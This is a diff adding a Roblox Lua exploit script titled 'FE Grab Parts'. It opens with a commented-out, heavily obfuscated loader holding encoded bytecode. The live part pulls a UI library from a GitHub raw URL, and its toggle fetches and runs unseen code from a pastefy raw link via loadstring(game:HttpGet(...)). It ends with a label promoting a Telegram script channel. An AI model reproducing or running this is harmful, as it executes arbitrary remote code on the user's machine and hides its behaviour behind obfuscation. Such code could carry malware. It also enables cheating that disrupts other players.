@@ -1,0 +1,14 @@
+-- (function(s,...)local h;local r;local f;local d;local t;local b;local e=24915;local n=0;local l={};while n<935 do n=n+1;while n<0x244 and e%0x3f62<0x1fb1 do n=n+1 e=(e-871)%37971 local o=n+e if(e%0x2e02)>=0x1701 then e=(e*0x18a)%0xa840 while n<0x350 and e%0x3490<0x1a48 do n=n+1 e=(e*656)%9488 local d=n+e if(e%0x140c)<0xa06 then e=(e+0x15c)%0x5353 local e=76738 if not l[e]then l[e]=0x1 t=getfenv and getfenv();end elseif e%2~=0 then e=(e+0x3a0)%0x3ed4 local e=68997 if not l[e]then l[e]=0x1 end else e=(e-0x25d)%0x2ea9 n=n+1 local e=63749 if not l[e]then l[e]=0x1 f=string;end end end elseif e%2~=0 then e=(e*0x24e)%0x843e while n<0x243 and e%0x1f5e<0xfaf do n=n+1 e=(e*236)%36410 local t=n+e if(e%0x2596)>0x12cb then e=(e*0x27b)%0x6853 local e=77581 if not l[e]then l[e]=0x1 b=tonumber;end elseif e%2~=0 then e=(e-0xb5)%0x6d09 local e=68263 if not l[e]then l[e]=0x1 end else e=(e*0x190)%0xac15 n=n+1 local e=99117 if not l[e]then l[e]=0x1 r="\4\8\116\111\110\117\109\98\101\114\117\102\76\90\100\116\73\83\0\6\115\116\114
+
+
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/turtle"))()
+
+local OwO = library:Window("FE Grab Parts")
+
+
+OwO:Toggle("Click", true, function(bool)
+   loadstring(game:HttpGet(('https://pastefy.app/BbXuvVkK/raw'),true))() 
+
+end)
+
+OwO:Label("https://t.me/SpiderScriptRB", Color3.fromRGB(127, 143, 166))
